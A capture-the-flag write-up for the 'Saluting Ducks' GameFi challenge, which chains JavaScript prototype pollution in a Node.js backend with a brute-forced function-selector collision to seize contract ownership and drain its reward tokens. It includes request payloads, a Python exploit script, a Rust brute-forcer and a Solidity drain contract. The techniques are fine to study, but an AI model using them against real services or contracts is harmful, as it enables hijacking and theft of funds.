# Saluting Ducks (6 solves) (383 points)

```
All Tony's shitcoins got hacked. Liquidity providers of those shitcoins sued Tony. To reimburse the liquidity providers, Tony built a GameFi about ducks (ducks are the cutest animal!)

Hint 1: What happens when you compare values of different types in JS?
Hint 2: To solve this challenge, you need to leverage different JS features / common vulnerabilities.

== Challenge updated, please download the new code! ==
```

This is a really tough challenge, even the hints are released (it's not helpful to me as I already know about those before its released 🥲) it remains 0 solve until the author changed the code to make it easier, it is solved by me, @cbd and @minaminao

![](https://i.imgur.com/6Pc6S7q.png)

The goal of this challenge to drain all the rewardTokens (1e32) from the challenge contract

```solidity
    function isSolved() public view returns (bool) {
        return rewardToken.balanceOf(address(this)) == 0;
    }
```

The challenge contract is the contract of a GameFi, and the backend is in nodejs

The game is about minting ducks by clicking the gift boxes, and combining 2 ducks to become 1 higher level duck

![](https://i.imgur.com/tWvrped.png)

First I read the contract, `checkpoint()` is the only function that can transfer `rewardToken` out of the challenge contract, although it has onlyOwner modifier, it will be called by the backend (owner) when we send POST request to the backend

```solidity
    uint256 public timePerClaim = 1 days;
...
        // claim profit every `timePerClaim` seconds
        if (info.lastProfitClaim + timePerClaim < block.timestamp) {
            uint256 timeSinceLastCheckpoint = block.timestamp - info.lastProfitClaim;
            rewardToken.transfer(info.rewardReceiver, timeSinceLastCheckpoint * info.profitPerSecond);
            info.lastProfitClaim = block.timestamp;
        }
```

However it only claim profit every `timePerClaim` seconds, which is 1 day, it is not possible as the challenge instance will expire in 24 minutes, and it is using block.timestamp for the time, the timestamp sent in the POST request is not used at all except for the event

This `updateSettings()` is the only function that can change the timePerClaim, and it is only callable by the owner

```solidity
    function updateSettings(address _owner, uint256 _combinedMultiplier, uint256 _timePerClaim) external onlyOwner {
        combinedMultiplier = _combinedMultiplier;
        owner = _owner;
        timePerClaim = _timePerClaim;
    }
```

But the backend (owner) only send transaction with function signature of the `checkpoint` function using the `Checkpoint` object with the Abi object initialized with `checkpoint`, and it calls (eth_call only, not sending transaction) with `getDucks()`

It never interact with `updateSettings()`, so I think maybe we have to use something like prototype pollution to overwrite the function signature, but I'm not too familiar with prototype pollution and @cbd helped a lot

At first, I try to change the functionName property, but it will always set the functionName properly in the object so prototype pollution cant override it

When we are sending a POST request to /checkpoint, it will call duckEmulator with the userId's state or {} (which is added after the change)

```js
        userIdToState[userId] = duckEmulator(userIdToState[userId] || {}, sequences);
```

In duckEmulator, if `action.type` is "combine" it will access the `action.level` property of `state.ducks`, and we can control `action.level` in our POST request, if we are setting it to `__proto__`, it will pollute the prototype and add properties like `amount` and `names`

```js
// Emulator for duck checkpoint, checks for timestamp and duck amount
function duckEmulator(_state, actions) {
    // do a deep copy
    let state = JSON.parse(JSON.stringify(_state));
    function avoid(condition, message) { if (condition) throw new Error(message) }
    actions.forEach((action) => {
        const timeNow = Math.floor(Date.now() / 1000);
        avoid(!state.initialized, "Account not initialized")
        if (action.type == "mint") {
            avoid(timeNow < state.checkpoint + 3, "Timestamp not increasing")
            state.checkpoint += 3;
            state.ducks[0].amount += 1;
            state.ducks[0].names = state.ducks[0].names || [];
            state.ducks[0].names.push(action.duckName);
        } else if (action.type == "combine") {
            avoid((action.level < 1 || action.level >= duckMaxLevel), "Invalid level")
            state.ducks[action.level].amount += 1;
            state.ducks[action.level].names = state.ducks[action.level].names || [];
            state.ducks[action.level].names.push((action.duckNames).join("❤️"));
            state.ducks[action.level].lastCombined = action.duckNames[0];

            avoid(state.ducks[action.level - 1].amount < 2, "Not enough ducks")
            state.ducks[action.level - 1].names = state.ducks[action.level - 1].names
                .filter((x) => action.duckNames.indexOf(x) == -1);
            state.ducks[action.level - 1].amount -= 2;
        }
    });
    return state;
}
```

Then I try to test it locally and print out the prototype

By sending a POST request to /checkpoint with this json data :

```
{"userToken":"4gi22ibkv0p19lt5ck0xv7","sequences":[{"type":"combine","level":"__proto__","duckNames":["Dragana","Amoli"]}]}
```

It will pollute the prototype to this :

```
[Object: null prototype] {
  amount: NaN,
  names: [ 'Dragana❤️Amoli' ],
  lastCombined: 'Dragana'
}
```

But it has an error, because after the prototype pollution, it tries to access the `state.ducks[action.level - 1].amount`, which is undefined

```
error : TypeError: Cannot read properties of undefined (reading 'amount')
```

```js
            avoid(state.ducks[action.level - 1].amount < 2, "Not enough ducks")
```

But it doesn't matter because the prototype has been polluted and the properties stay there until the process end

```js
        // get the return type of the function
        this.returnType = functionAbi.outputs.map((x) => x.type);
        // get the function signature
        this.signature = functionAbi.name + "(" + this.types.join(",") + ")";
        console.log(this.signature);
```

Then, by printing out the function signature, we can see that it is changed from this :

```
checkpoint(uint256,(uint8,uint256,uint256)[])
```

to this :

```
checkpoint(uint256,(uint8,uint256,uint256)[],Dragana❤️Amoli,Dragana)
```

It added the `names` and `lastCombined` inside the function signature, which is then used to calculate the function signatire hash

```js
    getFunctionSignatureHash() { return web3.eth.abi.encodeFunctionSignature(this.signature);}
    encodeParameters(params) { return web3.eth.abi.encodeParameters(this.inputAbi, params) }
    encode(params) { return this.getFunctionSignatureHash() + this.encodeParameters(params).slice(2) }
```

So, we can bruteforce a function signature that has the same function signature hash as `updateSettings()`

```
# cast sig "updateSettings(address,uint256,uint256)"
0x1b220281
```

It does this because it is using a for in loop to set the types in the function signature, and we have polluted the prototype so it will push `names` and `lastCombined` as the types and add to the function signature

```js
        // get the types of the function
        for (let input in functionAbi.inputs) {
            try {
                // get the type of the input, allowing for shorthand
                let ty = functionAbi.inputs[input].type || functionAbi.inputs[input];
                if (!ty) continue;
                // if the type is a tuple, get the components and encode to type
                if (ty.length > 5 && ty.startsWith("tuple")) {
                    let components = functionAbi.inputs[input].components;
                    if (!components || components.length == 0) throw new Error("Tuple components not found")
                    let tupleTypes = components.map((x) => x.type);
                    this.types.push("(" + tupleTypes.join(",") + ")" + ty.slice(5))
                } else {
                    this.types.push(ty);
                }
            } catch {}
        }
```

But we also have to set the address argument of `updateSettings()` to our address to become the owner, and it will set `userId` as the first argument, which is randomly generated when we register our `userToken`

```js
class Checkpoint {
    constructor(userId) {
        this.abi = new Abi("checkpoint");
        this.params = [userId, []];
    }

    initializeAccount(rewardAddr) { this.params[1].push([0, 0, rewardAddr]) }
    mintDuck(timestamp) { this.params[1].push([1, timestamp, 0]) }
    combineDucks(duckLevel) { this.params[1].push([2, 0, duckLevel]) }
    async sendTx() { return await this.abi.sendTx(this.params) }
}
```

When we are sending a POST request to /checkpoint, it will set userId as `userTokenToId[userToken]`, and we can control userToken, so we can set it to something we have polluted like `lastCombined` to control the userId

```js
    const userId = userTokenToId[userToken];
```

Then just generate an EOA and bruteforce a function signature that has the same function signature hash as `updateSettings()` (0x1b220281)

```
(PRIVATE KEY) : 0x1b0c68f629e4d5bd555352706da5d862fe22f889b9fcdea6edc1a3a6847710a2
Address: 0x3CEdf1aD30f4DAC57196a3b7Ef4b2F9B0ad536Db

 »  abi.encode(0x3CEdf1aD30f4DAC57196a3b7Ef4b2F9B0ad536Db)
0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db
```

At first I wrote a python script for that, but it is really slow, and @minaminao did it in rust which is much faster

```
Hash: 0x1b220281, Sig: checkpoint(uint256,(uint8,uint256,uint256)[],8635571430,0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db,0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db)
```

```rust
fn function_selector_blaz_ctf() {
    for i in 0..(1u64<<36) {
        let function_sig = format!("checkpoint(uint256,(uint8,uint256,uint256)[],{},0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db,0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db)", i);
        let out = ethers::utils::keccak256(function_sig.as_bytes());
        let function_selector = &out[0..4];
        if function_selector[0..3] == [0x1b, 0x22, 0x02] {
            println!("Hash: 0x{}, Sig: {}", ethers::utils::hex::encode(function_selector), function_sig);
            if function_selector[3] == 0x81 {
                print!("Yes!");
                break;
            }
        }
    }
}
```

I wrote a script to automate the exploit to become the owner

```python
import requests

url = "http://bdfnrentvqmqnzvalrlqgsvp-main.web.ctf.so:8080/"

# register userToken, the rewardAddr doesnt matter
burp0_url = f"{url}register?userToken=4gi22ibkv0p19lt5ck0xv7&rewardAddr=0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
res = requests.get(burp0_url)
print(res.text)

# this will give error, but the prototype is polluted already
burp0_url = f"{url}checkpoint"
burp0_json={"sequences": [{"duckNames": ["8635571430"], "level": "__proto__", "type": "combine"}], "userToken": "4gi22ibkv0p19lt5ck0xv7"}
res = requests.post(burp0_url, json=burp0_json)
print(res.text)

# this will give error, but the prototype is polluted already
burp0_json={"sequences": [{"duckNames": ["0x0000000000000000000000003cedf1ad30f4dac57196a3b7ef4b2f9b0ad536db"], "level": "__proto__", "type": "combine"}], "userToken": "4gi22ibkv0p19lt5ck0xv7"}
res = requests.post(burp0_url, json=burp0_json)
print(res.text)

# send transaction for updateSettings() to set our address as owner
burp0_json={"sequences": [], "userToken": "lastCombined"}
res = requests.post(burp0_url, json=burp0_json)
print(res.text)
```

Just run it and our EOA becomes the owner

```
# python3 changeOwner.py 
{"succuss":true}
{"succuss":false,"error":{}}
{"succuss":false,"error":{}}
{"succuss":true}

# cast call 0x96859b47bb03223104c9f12E7016dAaD9971d107 "owner()(address)" -r http://rpc.ctf.so:8545/bdfnrentvqmqnzvalrlqgsvp/main
0x3CEdf1aD30f4DAC57196a3b7Ef4b2F9B0ad536Db
```

Then we have to drain the rewardToken from the challenge contract by changing `combinedMultiplier` and `timePerClaim`, as we are now the owner we can change it easily by just calling `updateSettings()` 

I wrote a contract to precisely drain the all 1e32 of rewardToken from the challenge contract to 0 or revert if the time passed can't drain the challenge contract completely

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploit {
    Challenge public chal;
    uint public oldTime;

    constructor(address _chal) {
        chal = Challenge(_chal);
    }

    function solve() public {
        Challenge.Action[] memory actions = new Challenge.Action[](1);
        actions[0]._type = 0;
        actions[0].timestamp = 0;
        actions[0].extraInfo = uint256(uint160(address(this)));
        chal.checkpoint(1337, actions);
        
        actions[0]._type = 1;
        actions[0].timestamp = 1;
        chal.checkpoint(1337, actions);

        actions[0]._type = 1;
        actions[0].timestamp = 1;
        chal.checkpoint(1337, actions);
        oldTime = block.timestamp;
    }

    function solve2() public {
        Challenge.Action[] memory actions = new Challenge.Action[](1);
        uint multiplier = uint(1e32)/(block.timestamp-oldTime) - 2;
        require((2 + multiplier ) * (block.timestamp-oldTime) == uint(1e32), "1e32 isnt divisible");
        chal.updateSettings(address(this), multiplier, 0);
        actions[0]._type = 2;
        actions[0].timestamp = 1;
        actions[0].extraInfo = 1;
        chal.checkpoint(1337, actions);
    }
}
```

Just deploy the contract and transfer the ownership from 0x3CEdf1aD30f4DAC57196a3b7Ef4b2F9B0ad536Db to the contract with `updateSettings()` and call `solve()` and then call `solve2()` until it does not revert

### Flag

```
blaz{duc7_p00p_1s_7h3_b3s7_p00p}
```